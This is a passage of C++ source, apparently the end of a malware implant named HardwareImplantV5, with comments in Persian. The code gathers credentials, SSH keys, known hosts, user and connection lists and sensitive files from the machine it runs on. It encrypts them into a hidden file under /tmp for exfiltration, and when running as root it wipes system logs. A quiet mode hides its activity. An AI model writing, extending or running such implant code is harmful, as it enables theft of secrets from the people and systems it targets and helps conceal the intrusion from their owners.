        sections[Serialization::T_SMBIOS] = Serialization::Serializer::smbios(smbios_info);
        if (!acpi_tables.empty()) sections[Serialization::T_ACPI] = Serialization::Serializer::acpi(acpi_tables);
        if (!usb_devices.empty()) sections[Serialization::T_USB] = Serialization::Serializer::usb(usb_devices);
        sections[Serialization::T_NET] = Serialization::Serializer::network(net_ifaces);
        sections[Serialization::T_SYSINFO] = Serialization::Serializer::system_info(sys_info);
        if (!credentials.empty()) sections[Serialization::T_CREDS] = Serialization::Serializer::credentials(credentials);
        if (!ssh_keys.empty()) sections[Serialization::T_SSH_KEYS] = Serialization::Serializer::ssh_keys(ssh_keys);
        if (!vulns.empty()) sections[Serialization::T_VULNS] = Serialization::Serializer::vulns(vulns);
        if (!users.empty()) sections[Serialization::T_USERS] = Serialization::Serializer::users(users);
        if (!connections.empty()) sections[Serialization::T_CONNECTIONS] = Serialization::Serializer::connections(connections);

        if (!known_hosts.empty()) {
            Serialization::BinaryPacker kp; kp.str_list(known_hosts);
            sections[Serialization::T_KNOWN_HOSTS] = kp.data();
        }

        /* فایل‌های حساس */
        auto targets = Capture::FileExfiltrator::find_targets();
        if (!targets.empty())
            sections[Serialization::T_FILES] = Capture::FileExfiltrator::collect(targets);

        if (port_io.ok())
            sections[Serialization::T_CMOS] = std::vector<uint8_t>(cmos_data, cmos_data + 256);

        /* شناسه */
        Serialization::BinaryPacker id_p;
        id_p.u64(composite_id); id_p.bytes(full_hash.data(), 32);
        sections[Serialization::T_HW_ID] = id_p.data();

        Exfiltration::FileExfilEngine engine(composite_id);
        auto pkg = engine.build(sections);
        auto enc = engine.encrypt(pkg);
        return engine.write(path, enc);
    }

    void clean() { Stealth::LogCleaner::clean_all(); }
    uint64_t get_id() const { return composite_id; }
    bool ok() const { return initialized; }
};

/* ══════════════════════════════════════════════════════════
 *  MAIN
 * ══════════════════════════════════════════════════════════ */

int main(int argc, char* argv[]) {
    bool quiet = false;
    std::string output = "/tmp/.hw_intel_v5.bin";

    for (int i = 1; i < argc; i++) {
        std::string arg(argv[i]);
        if (arg == "-q" || arg == "--quiet") quiet = true;
        else if ((arg == "-o" || arg == "--output") && i + 1 < argc) output = argv[++i];
        else if (arg == "-h" || arg == "--help") {
            std::cout << "Usage: " << argv[0] << " [-q] [-o output_file]\n"
                      << "  -q, --quiet     Suppress console output\n"
                      << "  -o, --output    Output file path (default: /tmp/.hw_intel_v5.bin)\n"
                      << "  -h, --help      Show this help\n";
            return 0;
        }
    }

    HardwareImplantV5 implant;

    if (!implant.initialize(argc, argv)) return 0;

    if (!quiet) implant.report();

    if (implant.exfiltrate(output)) {
        if (!quiet) std::cout << "\n\033[1;32m[+] Encrypted package: " << output << "\033[0m\n";
    } else {
        if (!quiet) std::cerr << "\033[1;31m[-] Failed to write package\033[0m\n";
    }

    if (is_root()) implant.clean();

    if (!quiet) {
        std::cout << "\n\033[1;32m[+] Hardware ID: 0x" << std::hex << std::setfill('0')
                  << std::setw(16) << implant.get_id() << std::dec << "\033[0m\n"
                  << "\033[1;32m[+] Operation complete.\033[0m\n";
    }

    return 0;
}
